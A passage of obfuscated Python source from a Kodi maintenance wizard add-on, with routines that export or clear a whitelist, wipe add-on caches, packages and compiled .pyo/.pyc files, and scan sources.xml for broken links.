                    O00O0OOO000OO0OOO ="['%s', '%s', '%s']"%(OO0000OOOOOO00000 ,OO000000O00OO0OO0 ,O0O0O000O0OOO000O )#line:2642
                    if len (O0000O000O00O0O00 )+OOO0O0OOOO0O0O0O0 >1 :O00O0OOO000OO0OOO ="\n%s"%O00O0OOO000OO0OOO #line:2643
                    OO0OO0OOOO0O0OO0O .write (O00O0OOO000OO0OOO )#line:2644
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Item(s) Added[/COLOR]"%(COLOR2 ,OOO0O0OOOO0O0O0O0 ))#line:2645
    elif OOO00OOOOOOO00OOO =='export':#line:2646
        O0O000O00OOOO0O0O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the whitelist file[/COLOR]'%COLOR2 ,'files','.txt',False ,False ,HOME )#line:2647
        log (str (O0O000O00OOOO0O0O ),5 )#line:2648
        try :#line:2649
            xbmcvfs .copy (WHITELIST ,os .path .join (O0O000O00OOOO0O0O ,'whitelist.txt'))#line:2650
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]Whitelist has been exported to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0O000O00OOOO0O0O ,'whitelist.txt')))#line:2651
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Whitelist Exported[/COLOR]"%(COLOR2 ))#line:2652
        except Exception as O0OOOOO0O0OO0OO00 :#line:2653
            log ("Export Error: %s"%str (O0OOOOO0O0OO0OO00 ),5 )#line:2654
            if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The location you selected isnt writable would you like to select another one?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Location[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:2655
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Whitelist Export Cancelled[/COLOR]"%(COLOR2 ,O0OOOOO0O0OO0OO00 ))#line:2656
            else :#line:2657
                OOOO00OO0000OOOOO (export )#line:2658
    elif OOO00OOOOOOO00OOO =='clear':#line:2659
        if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Are you sure you want to clear your whitelist?"%COLOR2 ,"This process can't be undone.[/COLOR]",yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):#line:2660
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Clear Whitelist Cancelled[/COLOR]"%(COLOR2 ))#line:2661
            return #line:2662
        try :#line:2663
            os .remove (WHITELIST )#line:2664
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Whitelist Cleared[/COLOR]"%(COLOR2 ))#line:2665
        except :#line:2666
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Error Clearing Whitelist![/COLOR]"%(COLOR2 ))#line:2667
def clearPackages (over =None ):#line:2669
    try :#line:2670
        CleanPYO ()#line:2671
    except :pass #line:2672
    if os .path .exists (PACKAGES ):#line:2673
        try :#line:2674
            for OOOOOO0O0O000OOOO ,OOO0O00O00OO0O0O0 ,OO0O000O0O0OO00OO in os .walk (PACKAGES ):#line:2675
                OO0000O0000O0OO0O =0 #line:2676
                OO0000O0000O0OO0O +=len (OO0O000O0O0OO00OO )#line:2677
                if OO0000O0000O0OO0O >0 :#line:2678
                    O0OOO00O00O0OO00O =convertSize (getSize (PACKAGES ))#line:2679
                    if over :O00OO000O00O0OOO0 =1 #line:2680
                    else :O00OO000O00O0OOO0 =1 #line:2681
                    if O00OO000O00O0OOO0 :#line:2682
                        for OOO00O000O0O0OOOO in OO0O000O0O0OO00OO :os .unlink (os .path .join (OOOOOO0O0O000OOOO ,OOO00O000O0O0OOOO ))#line:2683
                        for O0OOO0000OOOO0O0O in OOO0O00O00OO0O0O0 :shutil .rmtree (os .path .join (OOOOOO0O0O000OOOO ,O0OOO0000OOOO0O0O ))#line:2684
        except Exception as OO00OO0O0O0OOO00O :#line:2687
            log ("Clear Packages Error: %s"%str (OO00OO0O0O0OOO00O ),5 )#line:2689
def clearPackagesStartup ():#line:2692
    OOO0OO0O0000O0000 =datetime .utcnow ()-timedelta (minutes =3 )#line:2693
    O0O00O0O0OOO0O000 =0 ;O0000OO000O0OO000 =0 #line:2694
    if os .path .exists (PACKAGES ):#line:2695
        OOOOO00OO0OO0OO00 =os .listdir (PACKAGES )#line:2696
        OOOOO00OO0OO0OO00 .sort (key =lambda OOOOOOOOO00O000O0 :os .path .getmtime (os .path .join (PACKAGES ,OOOOOOOOO00O000O0 )))#line:2697
        try :#line:2698
            for OOO00O0O0OOOO00OO in OOOOO00OO0OO0OO00 :#line:2699
                OO0O0OOOOOOOOO00O =os .path .join (PACKAGES ,OOO00O0O0OOOO00OO )#line:2700
                OO000O00O00OO00O0 =datetime .utcfromtimestamp (os .path .getmtime (OO0O0OOOOOOOOO00O ))#line:2701
                if OO000O00O00OO00O0 <=OOO0OO0O0000O0000 :#line:2702
                    if os .path .isfile (OO0O0OOOOOOOOO00O ):#line:2703
                        O0O00O0O0OOO0O000 +=1 #line:2704
                        O0000OO000O0OO000 +=os .path .getsize (OO0O0OOOOOOOOO00O )#line:2705
                        os .unlink (OO0O0OOOOOOOOO00O )#line:2706
                    elif os .path .isdir (OO0O0OOOOOOOOO00O ):#line:2707
                        O0000OO000O0OO000 +=getSize (OO0O0OOOOOOOOO00O )#line:2708
                        O000OOOO0O00O0OO0 ,O0O0O00O0OOOOO0OO =cleanHouse (OO0O0OOOOOOOOO00O )#line:2709
                        O0O00O0O0OOO0O000 +=O000OOOO0O00O0OO0 +O0O0O00O0OOOOO0OO #line:2710
                        try :#line:2711
                            shutil .rmtree (OO0O0OOOOOOOOO00O )#line:2712
                        except Exception as O0O0OO00O0OOOOO00 :#line:2713
                            log ("Failed to remove %s: %s"%(OO0O0OOOOOOOOO00O ,str (O0O0OO00O0OOOOO00 ),5 ))#line:2714
            if O0O00O0O0OOO0O000 >0 :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Success: %s[/COLOR]'%(COLOR2 ,convertSize (O0000OO000O0OO000 )))#line:2715
            else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:2716
        except Exception as O0O0OO00O0OOOOO00 :#line:2717
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Error![/COLOR]'%COLOR2 )#line:2718
            log ("Clear Packages Error: %s"%str (O0O0OO00O0OOOOO00 ),5 )#line:2719
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:2720
def clearCache (over =None ):#line:2722
    O00O0O0OO0O0OO00O =os .path .join (PROFILE ,'addon_data')#line:2733
    OO0OOO0OOOOO0OOO0 =[(os .path .join (ADDONDATA ,'plugin.video.HebDub.movies','database.db')),(os .path .join (ADDONDATA ,'plugin.video.bob','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.specto','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db')),(os .path .join (DATABASE ,'onechannelcache.db')),(os .path .join (DATABASE ,'saltscache.db')),(os .path .join (DATABASE ,'saltshd.lite.db'))]#line:2742
    O00OOOOO0O0O0O000 =[(O00O0O0OO0O0OO00O ),(ADDONDATA ),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'temp')),os .path .join (translatepath ('special://profile/addon_data/plugin.program.autocompletion/Google'),''),os .path .join (translatepath ('special://profile/addon_data/script.skin.helper.colorpicker/colors'),''),os .path .join (translatepath ('special://profile/addon_data/service.subtitles.All_Subs/temp_wizdom'),''),os .path .join (translatepath ('special://profile/addon_data/service.subtitles.All_Subs/temp'),''),os .path .join (translatepath ('special://profile/addon_data/script.colorbox'),''),os .path .join (translatepath ('special://profile/addon_data/script.module.metadatautils/animatedgifs'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/ArtistInformation'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/ArtistSlideshow'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/merge'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/temp'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/transition'),''),os .path .join (translatepath ('special://profile/addon_data/script.artistslideshow/resources'),''),os .path .join (translatepath ('special://profile/addon_data/plugin.video.movixws/logos'),''),os .path .join (translatepath ('special://profile/addon_data/service.subtitles.subscenter/temp'),''),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','Other')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','LocalAndRental')),(os .path .join (ADDONS ,'temp')),(os .path .join (O00O0O0OO0O0OO00O ,'script.module.simple.downloader')),(os .path .join (O00O0O0OO0O0OO00O ,'plugin.video.itv','Images'))]#line:2771
    O0OOOOOO0OOOOOO00 =0 #line:2772
    O00OO000OO0O0O00O =['meta_cache','archive_cache']#line:2773
    for O00000OOO00OO0OOO in O00OOOOO0O0O0O000 :#line:2774
        if os .path .exists (O00000OOO00OO0OOO )and not O00000OOO00OO0OOO in [ADDONDATA ,O00O0O0OO0O0OO00O ]:#line:2775
            for O0OO00O0000O0OOOO ,O0O00OOO0OO0OOOOO ,O0000O00O0OO0OO00 in os .walk (O00000OOO00OO0OOO ):#line:2776
                O0O00OOO0OO0OOOOO [:]=[O0O000O0000O0000O for O0O000O0000O0000O in O0O00OOO0OO0OOOOO if O0O000O0000O0000O not in O00OO000OO0O0O00O ]#line:2777
                OOOOO00000O0O0O0O =0 #line:2778
                OOOOO00000O0O0O0O +=len (O0000O00O0OO0OO00 )#line:2779
                if OOOOO00000O0O0O0O >0 :#line:2780
                    for OO000OOOOO0O0O0OO in O0000O00O0OO0OO00 :#line:2781
                        if not OO000OOOOO0O0O0OO in LOGFILES :#line:2782
                            try :#line:2783
                                os .unlink (os .path .join (O0OO00O0000O0OOOO ,OO000OOOOO0O0O0OO ))#line:2784
                                log ("[Wiped] %s"%os .path .join (O0OO00O0000O0OOOO ,OO000OOOOO0O0O0OO ),5 )#line:2785
                                O0OOOOOO0OOOOOO00 +=1 #line:2786
                            except :#line:2787
                                pass #line:2788
                        else :log ('Ignore Log File: %s'%OO000OOOOO0O0O0OO ,5 )#line:2789
                    for OO0O0OOO0O0OOOOO0 in O0O00OOO0OO0OOOOO :#line:2790
                        try :#line:2791
                            shutil .rmtree (os .path .join (O0OO00O0000O0OOOO ,OO0O0OOO0O0OOOOO0 ))#line:2792
                            O0OOOOOO0OOOOOO00 +=1 #line:2793
                            log ("[Success] cleared %s files from %s"%(str (OOOOO00000O0O0O0O ),os .path .join (O00000OOO00OO0OOO ,OO0O0OOO0O0OOOOO0 )),5 )#line:2794
                        except :#line:2795
                            log ("[Failed] to wipe cache in: %s"%os .path .join (O00000OOO00OO0OOO ,OO0O0OOO0O0OOOOO0 ),5 )#line:2796
    if os .path .exists (PACKAGES ):#line:2808
        try :#line:2809
            for O0OO00O0000O0OOOO ,O0O00OOO0OO0OOOOO ,O0000O00O0OO0OO00 in os .walk (PACKAGES ):#line:2810
                OOOOO00000O0O0O0O =0 #line:2811
                OOOOO00000O0O0O0O +=len (O0000O00O0OO0OO00 )#line:2812
                if OOOOO00000O0O0O0O >0 :#line:2813
                    OO0O0OO00O00OO0O0 =convertSize (getSize (PACKAGES ))#line:2814
                    if over :O00OOO0OOO000O000 =1 #line:2815
                    else :O00OOO0OOO000O000 =1 #line:2816
                    if O00OOO0OOO000O000 :#line:2817
                        for OO000OOOOO0O0O0OO in O0000O00O0OO0OO00 :os .unlink (os .path .join (O0OO00O0000O0OOOO ,OO000OOOOO0O0O0OO ))#line:2818
                        for OO0O0OOO0O0OOOOO0 in O0O00OOO0OO0OOOOO :shutil .rmtree (os .path .join (O0OO00O0000O0OOOO ,OO0O0OOO0O0OOOOO0 ))#line:2819
        except Exception as O000O000O0O0O0OO0 :#line:2822
            log ("Clear Packages Error: %s"%str (O000O000O0O0O0OO0 ),5 )#line:2824
    if INCLUDEVIDEO =='true'and over ==None :#line:2826
        O0000O00O0OO0OO00 =[]#line:2827
        if INCLUDEALL =='true':O0000O00O0OO0OO00 =OO0OOO0OOOOO0OOO0 #line:2828
        else :#line:2829
            if INCLUDEBOB =='true':O0000O00O0OO0OO00 .append (os .path .join (ADDONDATA ,'plugin.video.bob','cache.db'))#line:2830
            if INCLUDEPHOENIX =='true':O0000O00O0OO0OO00 .append (os .path .join (ADDONDATA ,'plugin.video.HebDub.movies','database.db'))#line:2831
            if INCLUDESPECTO =='true':O0000O00O0OO0OO00 .append (os .path .join (ADDONDATA ,'plugin.video.specto','cache.db'))#line:2832
            if INCLUDEGENESIS =='true':O0000O00O0OO0OO00 .append (os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db'))#line:2833
            if INCLUDEEXODUS =='true':O0000O00O0OO0OO00 .append (os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db'))#line:2834
            if INCLUDEONECHAN =='true':O0000O00O0OO0OO00 .append (os .path .join (DATABASE ,'onechannelcache.db'))#line:2835
            if INCLUDESALTS =='true':O0000O00O0OO0OO00 .append (os .path .join (DATABASE ,'saltscache.db'))#line:2836
            if INCLUDESALTSHD =='true':O0000O00O0OO0OO00 .append (os .path .join (DATABASE ,'saltshd.lite.db'))#line:2837
        if len (O0000O00O0OO0OO00 )>0 :#line:2838
            for O00000OOO00OO0OOO in O0000O00O0OO0OO00 :#line:2839
                if os .path .exists (O00000OOO00OO0OOO ):#line:2840
                    O0OOOOOO0OOOOOO00 +=1 #line:2841
                    try :#line:2842
                        OOO0O0O0OO00O00O0 =database .connect (O00000OOO00OO0OOO )#line:2843
                        O0000O00OO0O00000 =OOO0O0O0OO00O00O0 .cursor ()#line:2844
                    except Exception as O000O000O0O0O0OO0 :#line:2845
                        log ("DB Connection error: %s"%str (O000O000O0O0O0OO0 ),5 )#line:2846
                        continue #line:2847
                    if 'Database'in O00000OOO00OO0OOO :#line:2848
                        try :#line:2849
                            O0000O00OO0O00000 .execute ("DELETE FROM url_cache")#line:2850
                            O0000O00OO0O00000 .execute ("VACUUM")#line:2851
                            OOO0O0O0OO00O00O0 .commit ()#line:2852
                            O0000O00OO0O00000 .close ()#line:2853
                            log ("[Success] wiped %s"%O00000OOO00OO0OOO ,5 )#line:2854
                        except Exception as O000O000O0O0O0OO0 :#line:2855
                            log ("[Failed] wiped %s: %s"%(O00000OOO00OO0OOO ,str (O000O000O0O0O0OO0 )),5 )#line:2856
                    else :#line:2857
                        O0000O00OO0O00000 .execute ("SELECT name FROM sqlite_master WHERE type = 'table'")#line:2858
                        for OO0OOOO000OO00000 in O0000O00OO0O00000 .fetchall ():#line:2859
                            try :#line:2860
                                O0000O00OO0O00000 .execute ("DELETE FROM %s"%OO0OOOO000OO00000 [0 ])#line:2861
                                O0000O00OO0O00000 .execute ("VACUUM")#line:2862
                                OOO0O0O0OO00O00O0 .commit ()#line:2863
                                log ("[Success] wiped %s in %s"%(OO0OOOO000OO00000 ,O00000OOO00OO0OOO ),5 )#line:2864
                            except Exception as O000O000O0O0O0OO0 :#line:2865
                                log ("[Failed] wiped %s in %s: %s"%(OO0OOOO000OO00000 ,O00000OOO00OO0OOO ,str (O000O000O0O0O0OO0 )),5 )#line:2866
                        O0000O00OO0O00000 .close ()#line:2867
        else :log ("Clear Cache: Clear Video Cache Not Enabled",5 )#line:2868
def clearCache3 ():#line:2871
    OOO00OO00000O0O0O =os .path .join (PROFILE ,'addon_data')#line:2873
    O0O00O0000O0000O0 =[(OOO00OO00000O0O0O ),(ADDONDATA ),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'temp')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','Other')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','LocalAndRental')),(os .path .join (ADDONDATA ,'plugin.video.bob','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.bob.unleashed','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.specto','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.covenant','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.elementum','app.db-wal')),(os .path .join (ADDONDATA ,'plugin.video.itv','Images')),(os .path .join (DATABASE ,'onechannelcache.db')),(os .path .join (DATABASE ,'saltscache.db')),(os .path .join (DATABASE ,'saltshd.lite.db')),(os .path .join (OOO00OO00000O0O0O ,'script.module.simple.downloader')),(os .path .join (OOO00OO00000O0O0O ,'plugin.video.itv','Images'))]#line:2893
    OOO0OO00OOOOOO000 =0 #line:2895
    for OOO0OO0O00O00000O in O0O00O0000O0000O0 :#line:2897
        if os .path .exists (OOO0OO0O00O00000O )and not OOO0OO0O00O00000O in [ADDONDATA ,OOO00OO00000O0O0O ]:#line:2898
            for OO0OOO0OO000OOOOO ,O0O0OOOO00OO0OO0O ,O0OO00O0OOO0OOOO0 in os .walk (OOO0OO0O00O00000O ):#line:2899
                O000O0OO00OO00OO0 =0 #line:2900
                O000O0OO00OO00OO0 +=len (O0OO00O0OOO0OOOO0 )#line:2901
                if O000O0OO00OO00OO0 >0 :#line:2902
                    for OO0OOOOO000O00O0O in O0OO00O0OOO0OOOO0 :#line:2903
                        if not OO0OOOOO000O00O0O in ['kodi.log','tvmc.log','spmc.log','xbmc.log']:#line:2904
                            try :#line:2905
                                os .unlink (os .path .join (OO0OOO0OO000OOOOO ,OO0OOOOO000O00O0O ))#line:2906
                            except :#line:2907
                                pass #line:2908
                        else :log ('Ignore Log File: %s'%OO0OOOOO000O00O0O )#line:2909
                    for OO00O0000O0OOO0OO in O0O0OOOO00OO0OO0O :#line:2910
                        try :#line:2911
                            shutil .rmtree (os .path .join (OO0OOO0OO000OOOOO ,OO00O0000O0OOO0OO ))#line:2912
                            OOO0OO00OOOOOO000 +=1 #line:2913
                            log ("[COLOR red][Success]  %s Files Removed From %s [/COLOR]"%(str (O000O0OO00OO00OO0 ),os .path .join (OOO0OO0O00O00000O ,OO00O0000O0OOO0OO )))#line:2914
                        except :#line:2915
                            log ("[COLOR red][Failed] To Wipe Cache In: %s [/COLOR]"%os .path .join (OOO0OO0O00O00000O ,OO00O0000O0OOO0OO ))#line:2916
        else :#line:2917
            for OO0OOO0OO000OOOOO ,O0O0OOOO00OO0OO0O ,O0OO00O0OOO0OOOO0 in os .walk (OOO0OO0O00O00000O ):#line:2918
                for OO00O0000O0OOO0OO in O0O0OOOO00OO0OO0O :#line:2919
                    if 'cache'in OO00O0000O0OOO0OO .lower ():#line:2920
                        try :#line:2921
                            shutil .rmtree (os .path .join (OO0OOO0OO000OOOOO ,OO00O0000O0OOO0OO ))#line:2922
                            OOO0OO00OOOOOO000 +=1 #line:2923
                            log ("[COLOR white][Success] Wiped %s [/COLOR]"%os .path .join (OOO0OO0O00O00000O ,OO00O0000O0OOO0OO ))#line:2924
                        except :#line:2925
                            log ("[COLOR red][Failed] To Wipe Cache In: %s [/COLOR]"%os .path .join (OOO0OO0O00O00000O ,OO00O0000O0OOO0OO ))#line:2926
    LogNotify (ADDONTITLE ,'[COLOR white]Cache:[/COLOR] [COLOR red] %s Items Removed[/COLOR]'%OOO0OO00OOOOOO000 )#line:2928
origfolder =(translatepath ("special://home/addons"))#line:2929
def CleanPYO ():#line:2930
    OOO0000O0O0OOO00O =0 #line:2931
    for (OOOOO0O0O0OOOO0OO ,OOO000000OO000OOO ,O0O0OO0000OOO0O00 )in os .walk (origfolder ):#line:2932
       for OOOOO0OO00OOOOOOO in O0O0OO0000OOO0O00 :#line:2933
          if OOOOO0OO00OOOOOOO .endswith ('.pyo'):#line:2934
               os .remove (os .path .join (OOOOO0O0O0OOOO0OO ,OOOOO0OO00OOOOOOO ))#line:2936
          if OOOOO0OO00OOOOOOO .endswith ('.pyc'):#line:2937
               os .remove (os .path .join (OOOOO0O0O0OOOO0OO ,OOOOO0OO00OOOOOOO ))#line:2939
def fixwizard (over =None ):#line:2940
    OOOO0O0OOOO0O0O0O =os .path .join (PROFILE ,'addon_data')#line:2942
    OO0000O0OO000O0OO =[(OOOO0O0OOOO0O0O0O ),(ADDONDATA ),os .path .join (translatepath ('special://profile/addon_data/plugin.program.Anonymous'),'')]#line:2947
    O0000O000OO00O00O =0 #line:2948
    O0OOO0O000O000O0O =['meta_cache','archive_cache']#line:2949
    for OO000OOO0OOOO0OO0 in OO0000O0OO000O0OO :#line:2950
        if os .path .exists (OO000OOO0OOOO0OO0 )and not OO000OOO0OOOO0OO0 in [ADDONDATA ,OOOO0O0OOOO0O0O0O ]:#line:2951
            for O000O0O0O00O0O000 ,O0O0OOO0000OOOO0O ,OOOO00O00000OO0OO in os .walk (OO000OOO0OOOO0OO0 ):#line:2952
                O0O0OOO0000OOOO0O [:]=[OO0O0OO0O0OOOO00O for OO0O0OO0O0OOOO00O in O0O0OOO0000OOOO0O if OO0O0OO0O0OOOO00O not in O0OOO0O000O000O0O ]#line:2953
                OOO00O00OO0O00000 =0 #line:2954
                OOO00O00OO0O00000 +=len (OOOO00O00000OO0OO )#line:2955
                if OOO00O00OO0O00000 >0 :#line:2956
                    for O000O0O00O0O0OOOO in OOOO00O00000OO0OO :#line:2957
                        if not O000O0O00O0O0OOOO in LOGFILES :#line:2958
                            try :#line:2959
                                os .unlink (os .path .join (O000O0O0O00O0O000 ,O000O0O00O0O0OOOO ))#line:2960
                                log ("[Wiped] %s"%os .path .join (O000O0O0O00O0O000 ,O000O0O00O0O0OOOO ),5 )#line:2961
                                O0000O000OO00O00O +=1 #line:2962
                            except :#line:2963
                                pass #line:2964
                        else :log ('Ignore Log File: %s'%O000O0O00O0O0OOOO ,5 )#line:2965
                    for O0O0OO00O00O0OOOO in O0O0OOO0000OOOO0O :#line:2966
                        try :#line:2967
                            shutil .rmtree (os .path .join (O000O0O0O00O0O000 ,O0O0OO00O00O0OOOO ))#line:2968
                            O0000O000OO00O00O +=1 #line:2969
                            log ("[Success] cleared %s files from %s"%(str (OOO00O00OO0O00000 ),os .path .join (OO000OOO0OOOO0OO0 ,O0O0OO00O00O0OOOO )),5 )#line:2970
                        except :#line:2971
                            log ("[Failed] to wipe cache in: %s"%os .path .join (OO000OOO0OOOO0OO0 ,O0O0OO00O00O0OOOO ),5 )#line:2972
        else :#line:2973
            for O000O0O0O00O0O000 ,O0O0OOO0000OOOO0O ,OOOO00O00000OO0OO in os .walk (OO000OOO0OOOO0OO0 ):#line:2974
                O0O0OOO0000OOOO0O [:]=[OO0O00O0OOO00O000 for OO0O00O0OOO00O000 in O0O0OOO0000OOOO0O if OO0O00O0OOO00O000 not in O0OOO0O000O000O0O ]#line:2975
                for O0O0OO00O00O0OOOO in O0O0OOO0000OOOO0O :#line:2976
                    if not str (O0O0OO00O00O0OOOO .lower ()).find ('cache')==-1 :#line:2977
                        try :#line:2978
                            shutil .rmtree (os .path .join (O000O0O0O00O0O000 ,O0O0OO00O00O0OOOO ))#line:2979
                            O0000O000OO00O00O +=1 #line:2980
                            log ("[Success] wiped %s "%os .path .join (O000O0O0O00O0O000 ,O0O0OO00O00O0OOOO ),5 )#line:2981
                        except :#line:2982
                            log ("[Failed] to wipe cache in: %s"%os .path .join (OO000OOO0OOOO0OO0 ,O0O0OO00O00O0OOOO ),5 )#line:2983
    if os .path .exists (PACKAGES ):#line:2984
        try :#line:2985
            for O000O0O0O00O0O000 ,O0O0OOO0000OOOO0O ,OOOO00O00000OO0OO in os .walk (PACKAGES ):#line:2986
                OOO00O00OO0O00000 =0 #line:2987
                OOO00O00OO0O00000 +=len (OOOO00O00000OO0OO )#line:2988
                if OOO00O00OO0O00000 >0 :#line:2989
                    OOO0O0OO0OOOOOO00 =convertSize (getSize (PACKAGES ))#line:2990
                    if over :O0O0O00O00O0O0O0O =1 #line:2991
                    else :O0O0O00O00O0O0O0O =1 #line:2992
                    if O0O0O00O00O0O0O0O :#line:2993
                        for O000O0O00O0O0OOOO in OOOO00O00000OO0OO :os .unlink (os .path .join (O000O0O0O00O0O000 ,O000O0O00O0O0OOOO ))#line:2994
                        for O0O0OO00O00O0OOOO in O0O0OOO0000OOOO0O :shutil .rmtree (os .path .join (O000O0O0O00O0O000 ,O0O0OO00O00O0OOOO ))#line:2995
                        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Success![/COLOR]'%COLOR2 )#line:2996
        except Exception as O00OO0O00OO0OOO0O :#line:2998
            LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Error![/COLOR]'%COLOR2 )#line:2999
            log ("Clear Packages Error: %s"%str (O00OO0O00OO0OOO0O ),5 )#line:3000
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:3001
    LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]איפוס עבר בהצלחה %s Files[/COLOR]'%(COLOR2 ,O0000O000OO00O00O ))#line:3003
def checkSources ():#line:3005
    if not os .path .exists (SOURCES ):#line:3006
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Sources.xml File Found![/COLOR]"%COLOR2 )#line:3007
        return False #line:3008
    OOOOOO0OOO000000O =0 #line:3009
    O0O0O000OOOOO0O0O =[]#line:3010
    O00OOO0OOOOOO0OO0 =[]#line:3011
    OO000O00O0O0OOO00 =open (SOURCES )#line:3012
    O0OOOOOOO0OO000OO =OO000O00O0O0OOO00 .read ()#line:3013
    O0O00O0O0O000OOOO =O0OOOOOOO0OO000OO .replace ('\r','').replace ('\n','').replace ('\t','')#line:3014
    OO0000O0O0O000OOO =re .compile ('<files>.+?</files>').findall (O0O00O0O0O000OOOO )#line:3015
    OO000O00O0O0OOO00 .close ()#line:3016
    if len (OO0000O0O0O000OOO )>0 :#line:3017
        O00O0O0O00000OO00 =re .compile ('<source>.+?<name>(.+?)</name>.+?<path pathversion="1">(.+?)</path>.+?<allowsharing>(.+?)</allowsharing>.+?</source>').findall (OO0000O0O0O000OOO [0 ])#line:3018
        DP .create (ADDONTITLE ,"[COLOR %s]Scanning Sources for Broken links[/COLOR]"%COLOR2 )#line:3019
        for O00000OOOOOOO00O0 ,O0O0OO0OO00000OO0 ,O00O0OO0O000O0O00 in O00O0O0O00000OO00 :#line:3020
            OOOOOO0OOO000000O +=1 #line:3021
            OO0O0OO0OO0OO00OO =int (percentage (OOOOOO0OOO000000O ,len (O00O0O0O00000OO00 )))#line:3022
            DP .update (OO0O0OO0OO0OO00OO ,'',"[COLOR %s]Checking [COLOR %s]%s[/COLOR]:[/COLOR]"%(COLOR2 ,COLOR1 ,O00000OOOOOOO00O0 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OO0OO00000OO0 ))#line:3023
            if 'http'in O0O0OO0OO00000OO0 :#line:3024
                OO0OO000OOO000O00 =workingURL (O0O0OO0OO00000OO0 )#line:3025
                if not OO0OO000OOO000O00 ==True :#line:3026
                    O0O0O000OOOOO0O0O .append ([O00000OOOOOOO00O0 ,O0O0OO0OO00000OO0 ,O00O0OO0O000O0O00 ,OO0OO000OOO000O00 ])#line:3027
        log ("Bad Sources: %s"%len (O0O0O000OOOOO0O0O ),5 )#line:3029
        if len (O0O0O000OOOOO0O0O )>0 :#line:3030
            OOOOO00000OO0O000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] Source(s) have been found Broken"%(COLOR1 ,len (O0O0O000OOOOO0O0O ),COLOR2 ),"Would you like to Remove all or choose one by one?[/COLOR]",yeslabel ="[B][COLOR green]Remove All[/COLOR][/B]",nolabel ="[B][COLOR red]Choose to Delete[/COLOR][/B]")#line:3031
            if OOOOO00000OO0O000 ==1 :#line:3032
                O00OOO0OOOOOO0OO0 =O0O0O000OOOOO0O0O #line:3033
            else :#line:3034
                for O00000OOOOOOO00O0 ,O0O0OO0OO00000OO0 ,O00O0OO0O000O0O00 ,OO0OO000OOO000O00 in O0O0O000OOOOO0O0O :#line:3035
                    log ("%s sources: %s, %s"%(O00000OOOOOOO00O0 ,O0O0OO0OO00000OO0 ,OO0OO000OOO000O00 ),5 )#line:3036
                    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] was reported as non working"%(COLOR1 ,O00000OOOOOOO00O0 ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OO0OO00000OO0 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO000OOO000O00 ),yeslabel ="[B][COLOR green]Remove Source[/COLOR][/B]",nolabel ="[B][COLOR red]Keep Source[/COLOR][/B]"):#line:3037
                        O00OOO0OOOOOO0OO0 .append ([O00000OOOOOOO00O0 ,O0O0OO0OO00000OO0 ,O00O0OO0O000O0O00 ,OO0OO000OOO000O00 ])#line:3038
